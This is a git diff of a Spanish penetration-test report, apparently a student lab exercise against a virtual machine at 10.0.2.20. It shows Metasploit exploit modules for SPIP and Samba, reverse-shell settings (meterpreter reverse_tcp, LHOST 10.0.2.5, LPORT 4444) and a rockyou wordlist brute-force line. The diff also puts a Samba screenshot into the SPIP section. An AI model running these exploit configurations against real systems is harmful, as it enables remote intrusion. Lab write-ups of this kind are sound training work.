@@ -59,7 +59,7 @@ La máquina objetivo identificada en **10.0.2.20** presenta las siguientes carac
 
 | Puerto | Servicio | Versión |
 |--------|----------|---------|
-| 21 | FTP | ProFTPd |
+| 21 | FTP | - |
 | 22 | SSH | OpenSSH |
 | 80 | HTTP | Apache |
 | 3306 | MySQL | - |
@@ -175,6 +175,8 @@ set PASS_FILE /usr/share/wordlists/rockyou.txt
 
 ## 7. Vulnerabilidades Identificadas por Nessus
 
+### Destacar que Nessus fue bastante insuficiente debido a que muchos CVE no eran reconocidos por metaexploit, entre otras cosas más.
+
 ### 7.1 Vulnerabilidad SSL
 
 ![Vulnerabilidad SSL](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssl.png)
@@ -211,6 +213,8 @@ set PAYLOAD php/meterpreter/reverse_tcp
 
 ### 7.3 SPIP - Remote Code Execution
 
+![Configuración Samba](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba2.png)
+
 **Módulo de Metasploit:**
 
 ```
@@ -221,6 +225,8 @@ exploit/multi/http/spip_connect_exec
 
 ```ruby
 set RHOSTS 10.0.2.20
+set LHOST 10.0.2.5
+set LPORT 4444
 ```
 
 **Resultado:**
@@ -233,8 +239,6 @@ set RHOSTS 10.0.2.20
 
 ![Vulnerabilidad Samba](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba.png)
 
-![Configuración Samba](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba2.png)
-
 **Módulo de Metasploit:**
 
 ```
@@ -245,8 +249,6 @@ exploit/linux/samba/is_known_pipename
 
 ```ruby
 set RHOSTS 10.0.2.20
-set LHOST 10.0.2.5
-set LPORT 4444
 ```
 
 #### Resultado Exitoso Esperado
@@ -267,25 +269,39 @@ set LPORT 4444
 
 ## 8. Conclusiones
 
-### Vulnerabilidades Confirmadas
+## Aspectos Positivos
 
-1. **Drupal** - CVE-2018-7600 (Drupalgeddon2)
-2. **Samba** - Vulnerabilidad de ejecución remota
-3. **SSL/TLS** - Configuración débil
+- Enumeración exitosa de servicios y puertos
+- Identificación precisa de la máquina objetivo (10.0.2.20)
+- Detección de usuario potencial (chewbacca)
+- Uso combinado de múltiples herramientas (Nmap, Nessus, Metasploit)
+- Metodología estructurada de ataque
 
-### Recomendaciones
+## Problemas Encontrados
 
-- Actualizar todos los servicios a sus últimas versiones
-- Implementar autenticación de dos factores en SSH
-- Configurar rate limiting para prevenir ataques de fuerza bruta
-- Revisar y fortalecer la configuración SSL/TLS
-- Aplicar parches de seguridad pendientes
+### 1. Problemas con Nessus
 
----
+- Tiempos de escaneo excesivos que ralentizaron el proceso
+- Resultados incompletos o poco específicos
+- Consumo elevado de recursos del sistema
 
-**Fecha de Auditoría:** [Fecha]  
-**Auditor:** [Nombre]  
-**Nivel de Riesgo Global:** Alto
+### 2. Bloqueos de la Máquina Objetivo
+
+- A lo largo de la practica la máquina se bloqueó en dos ocasiones
+
+3. Problemas con Metasploit
+   
+- Exploits completados sin sesión (especialmente Drupal)
+- Detección automática fallida de versiones (SPIP)
+- Filtros de salida bloqueando conexiones reversas
+
+4. Limitaciones de Herramientas
+   
+- Nmap con scripts vuln: Extremadamente lento y poco efectivo
+
+
+**Creador:** [RodrigoMartínezHernández]  
+
 
 
 
